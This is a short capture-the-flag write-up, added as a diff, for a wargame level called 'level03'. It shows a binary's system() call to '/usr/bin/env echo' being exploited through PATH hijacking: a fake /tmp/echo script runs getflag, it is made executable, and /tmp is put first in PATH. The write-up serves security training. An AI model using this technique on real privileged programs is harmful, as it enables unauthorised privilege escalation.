@@ -1,0 +1,22 @@
+LEVEL03
+
+- There is a "level03" executable in the home directory. We want to analyze the binary using a reverse-engineering tool called ghidra.
+
+- When we look into the main function using ghidra, we see:
+"system("/usr/bin/env echo Exploit me"
+
+- A system call is made to execute the echo command, using /usr/bin/env
+- The usr/bin/env command searches the PATH env variables to locate the echo executable.
+- PATH contains directories which we can control such as "tmp", so we can manipulate it.
+
+- We create a script that mimics echo command, but executes the "getflag" command instead
+"nano /tmp/echo"
+"#!/bin/bash
+/bin/getflag"
+
+- We make this new script executable
+"chmod +x /tmp/echo"
+
+- We put the "/tmp" prefix to the PATH env variable, so that it will be the first directory to be searched for executables.
+- Running the executable will now trigger the getflag command and give us the flag:
+"./level03"
